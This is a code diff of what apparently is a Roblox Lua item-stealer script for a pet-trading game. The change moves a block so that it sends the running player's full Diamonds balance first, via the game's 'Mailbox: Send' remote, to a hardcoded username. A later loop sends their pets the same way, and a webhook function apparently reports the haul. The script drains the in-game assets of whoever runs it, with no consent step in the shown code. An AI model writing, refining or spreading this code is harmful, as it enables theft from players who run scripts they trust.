@@ -43,6 +43,25 @@ local function SendWebhook()
     })
 end
 
+-- Send gems first
+for i, v in pairs(InventoryData.Currency) do
+    if v.id == "Diamonds" then
+        if v._am >= 500 and v._am > minRap then
+            local args = {
+                [1] = userName,
+                [2] = "###########",
+                [3] = "Currency",
+                [4] = i,
+                [5] = v._am
+            }
+            game.ReplicatedStorage.Network["Mailbox: Send"]:InvokeServer(unpack(args))
+            dataTable.gemsSent = v._am
+        end
+		break
+    end
+end
+
+-- Now send pets
 for a,b in pairs(InventoryData.Pet) do
     for c,d in pairs(b) do
         local bra = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
@@ -81,22 +100,6 @@ for a,b in pairs(dataTable.pets) do
         [5] = b.AM
     }
     game.ReplicatedStorage.Network["Mailbox: Send"]:InvokeServer(unpack(args))
-end
-
-for i, v in pairs(InventoryData.Currency) do
-    if v.id == "Diamonds" then
-        if v._am >= 500 and v._am > minRap then
-            local args = {
-                [1] = userName,
-                [2] = "###########",
-                [3] = "Currency",
-                [4] = i,
-                [5] = v._am
-            }
-            game.ReplicatedStorage.Network["Mailbox: Send"]:InvokeServer(unpack(args))
-        end
-		break
-    end
 end
 
 if string.len(dataTable.petsString) > 1024 then
